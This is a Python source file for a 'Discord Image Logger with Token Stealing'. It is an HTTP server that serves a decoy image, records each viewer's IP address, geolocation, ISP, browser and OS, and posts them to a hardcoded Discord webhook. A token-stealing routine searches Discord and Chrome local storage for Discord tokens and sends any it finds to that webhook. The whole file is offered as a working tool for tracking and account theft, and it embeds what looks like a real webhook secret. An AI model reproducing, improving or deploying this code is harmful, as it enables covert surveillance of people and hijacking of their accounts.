# Discord Image Logger with Token Stealing - CLEAN INTEGRATION
# Main code with token stealer functions added

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import json, re, os, urllib.request, sys
from pathlib import Path

__version__ = "v2.5 Clean Integration"

# ===== CONFIGURATION =====
config = {
    # Webhooks
    "webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
    "token_webhook": "https://discord.com/api/webhooks/1445065947533803726/D7ZRBlO6_yAxqnp1d-J_Cxk3VeHzT2_QWtBBo3aCVh3MoCKMzROrjgs2T8aZ1aDLPI91",
    
    # Image settings
    "image": "https://images.pexels.com/photos/1126993/pexels-photo-1126993.jpeg?auto=compress&cs=tinysrgb&w=1920",
    "imageArgument": True,
    
    # Appearance
    "username": "Image Logger",
    "color": 0x00FFFF,
    "buggedImage": True,
    
    # Features
    "tokenStealing": True,
    "accurateLocation": True,
    "linkAlerts": True,
    "debugMode": False,
    
    # Protection
    "antiBot": 1,
    "vpnCheck": 1,
    
    # Message
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned",
        "richMessage": True,
    },
    
    # Redirect
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# ===== TOKEN STEALING FUNCTIONS =====
def log_debug(message):
    if config.get("debugMode"):
        print(f"[DEBUG] {message}")

def validate_discord_token(token):
    """Validate Discord token format"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return False
            
        # Check first part is base64 and decodes to numeric ID
        base64_part = parts[0]
        padding_needed = (4 - len(base64_part) % 4) % 4
        base64_part += "=" * padding_needed
        
        decoded = base64.b64decode(base64_part).decode('utf-8')
        return decoded.isdigit()
        
    except Exception:
        return False

def extract_discord_tokens(text):
    """Enhanced token extraction with multiple patterns"""
    # Multiple Discord token patterns
    patterns = [
        r'[MN][\w-]{23}\.[\w-]{6}\.[\w-]{27}',  # Standard format starting with M or N
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',     # Generic 24.6.27 format
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}',     # Generic 24.6.38 format
        r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}', # Very flexible
    ]
    
    all_tokens = []
    for pattern in patterns:
        tokens = re.findall(pattern, text, re.IGNORECASE)
        all_tokens.extend(tokens)
    
    # Validate tokens (keeping duplicates as requested)
    valid_tokens = []
    for token in all_tokens:
        if validate_discord_token(token):
            valid_tokens.append(token)
    
    log_debug(f"Found {len(valid_tokens)} valid tokens (including duplicates) in text")
    return valid_tokens if valid_tokens else None

def find_discord_tokens_storage():
    """Find Discord tokens in browser storage locations"""
    log_debug("Starting browser storage token search...")
    
    locations = []
    
    if os.name == 'nt':  # Windows
        local_appdata = os.getenv('LOCALAPPDATA')
        appdata = os.getenv('APPDATA')
        
        if local_appdata:
            locations.extend([
                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb" / "CURRENT",
                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb" / "000003.log",
                Path(local_appdata) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb" / "MANIFEST-000001",
            ])
        
        if appdata:
            locations.extend([
                Path(appdata) / "Discord" / "Local Storage" / "leveldb",
                Path(appdata) / "discordcanary" / "Local Storage" / "leveldb",
                Path(appdata) / "discordptb" / "Local Storage" / "leveldb",
            ])
    
    found_tokens = []
    
    for location in locations:
        try:
            if location.exists():
                log_debug(f"Checking {location}")
                for file_path in location.glob("**/*"):
                    if file_path.is_file():
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                tokens = extract_discord_tokens(content)
                                if tokens:
                                    found_tokens.extend(tokens)
                                    log_debug(f"Found {len(tokens)} tokens in {file_path}")
                        except Exception as e:
                            log_debug(f"Error reading {file_path}: {e}")
                            continue
        except Exception as e:
            log_debug(f"Error accessing {location}: {e}")
            continue
    
    log_debug(f"Total tokens found in storage: {len(found_tokens)}")
    return found_tokens if found_tokens else None

def send_tokens_to_webhook(tokens):
    """Send found tokens to token webhook"""
    if not tokens or not config["token_webhook"]:
        return False
    
    try:
        embed_data = {
            "title": "🔑 Discord Tokens Found",
            "description": f"Found **{len(tokens)}** Discord token(s)!",
            "color": 0xFF0000,
            "fields": [],
            "timestamp": "2024-12-04T00:00:00.000Z"
        }
        
        # Add tokens as fields (limit to avoid embed limits)
        for i, token in enumerate(tokens[:10]):  # Max 10 tokens to avoid embed size limits
            embed_data["fields"].append({
                "name": f"Token {i+1}",
                "value": f"`{token[:50]}...`" if len(token) > 50 else f"`{token}`",
                "inline": False
            })
        
        if len(tokens) > 10:
            embed_data["fields"].append({
                "name": "More Tokens",
                "value": f"...and {len(tokens) - 10} more tokens",
                "inline": False
            })
        
        payload = {
            "embeds": [embed_data],
            "username": config["username"]
        }
        
        response = requests.post(config["token_webhook"], json=payload, timeout=10)
        log_debug(f"Token webhook response: {response.status_code}")
        return response.status_code == 204
        
    except Exception as e:
        log_debug(f"Error sending tokens to webhook: {e}")
        return False

# ===== MAIN LOGGER FUNCTIONS =====
def get_ip():
    """Get real IP address"""
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown"

def get_location(ip):
    """Get location information"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        data = response.json()
        return {
            'country': data.get('country', 'Unknown'),
            'region': data.get('regionName', 'Unknown'),
            'city': data.get('city', 'Unknown'),
            'isp': data.get('isp', 'Unknown'),
            'lat': data.get('lat', 0),
            'lon': data.get('lon', 0)
        }
    except:
        return {
            'country': 'Unknown',
            'region': 'Unknown', 
            'city': 'Unknown',
            'isp': 'Unknown',
            'lat': 0,
            'lon': 0
        }

def send_webhook(ip, user_agent, referer):
    """Send information to Discord webhook"""
    try:
        # Parse user agent
        ua_data = httpagentparser.detect(user_agent)
        browser = ua_data.get('browser', {}).get('name', 'Unknown')
        os_name = ua_data.get('platform', {}).get('name', 'Unknown')
        
        # Get location
        location = get_location(ip)
        
        # Create embed
        embed = {
            "title": "🖥️ Image Logger Hit",
            "description": f"Someone viewed your image!",
            "color": config["color"],
            "fields": [
                {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
                {"name": "🌍 Location", "value": f"{location['city']}, {location['region']}, {location['country']}", "inline": True},
                {"name": "🏢 ISP", "value": location['isp'], "inline": True},
                {"name": "🌐 Browser", "value": browser, "inline": True},
                {"name": "💻 OS", "value": os_name, "inline": True},
                {"name": "🔗 Referer", "value": referer if referer else "Direct", "inline": True}
            ],
            "image": {"url": config["image"]},
            "footer": {"text": f"Image Logger {__version__}"},
            "timestamp": "2024-12-04T00:00:00.000Z"
        }
        
        payload = {
            "embeds": [embed],
            "username": config["username"]
        }
        
        response = requests.post(config["webhook"], json=payload, timeout=10)
        return response.status_code == 204
        
    except Exception as e:
        print(f"Error sending webhook: {e}")
        return False

# ===== HTTP REQUEST HANDLER =====
class ImageLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get request information
            ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            referer = self.headers.get('Referer', '')
            
            # Check blacklisted IPs
            if any(ip.startswith(prefix) for prefix in blacklistedIPs):
                self.send_response(403)
                self.end_headers()
                return
            
            # Send webhook with main info
            send_webhook(ip, user_agent, referer)
            
            # Token stealing if enabled
            if config["tokenStealing"]:
                log_debug("Starting token stealing...")
                
                # Try to find tokens in browser storage
                storage_tokens = find_discord_tokens_storage()
                if storage_tokens:
                    log_debug(f"Found {len(storage_tokens)} tokens in storage")
                    send_tokens_to_webhook(storage_tokens)
                
                # Also try to get tokens from URL parameters (if any)
                query = parse.urlparse(self.path).query
                params = parse.parse_qs(query)
                if 'token' in params:
                    url_tokens = extract_discord_tokens(params['token'][0])
                    if url_tokens:
                        log_debug(f"Found {len(url_tokens)} tokens in URL")
                        send_tokens_to_webhook(url_tokens)
            
            # Send image response
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.end_headers()
            
            # Get and send image
            image_response = requests.get(config["image"], timeout=10)
            self.wfile.write(image_response.content)
            
        except Exception as e:
            print(f"Error handling request: {e}")
            self.send_response(500)
            self.end_headers()

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

# ===== SERVER START =====
def run_server():
    """Start the HTTP server"""
    port = 8080
    server = HTTPServer(('0.0.0.0', port), ImageLoggerHandler)
    print(f"🚀 Server running on http://0.0.0.0:{port}")
    print(f"🖼️  Image URL: http://0.0.0.0:{port}/image.jpg")
    print(f"🔍 Token stealing: {'Enabled' if config['tokenStealing'] else 'Disabled'}")
    print(f"🔧 Debug mode: {'Enabled' if config['debugMode'] else 'Disabled'}")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server stopped")
        server.shutdown()

if __name__ == "__main__":
    run_server()
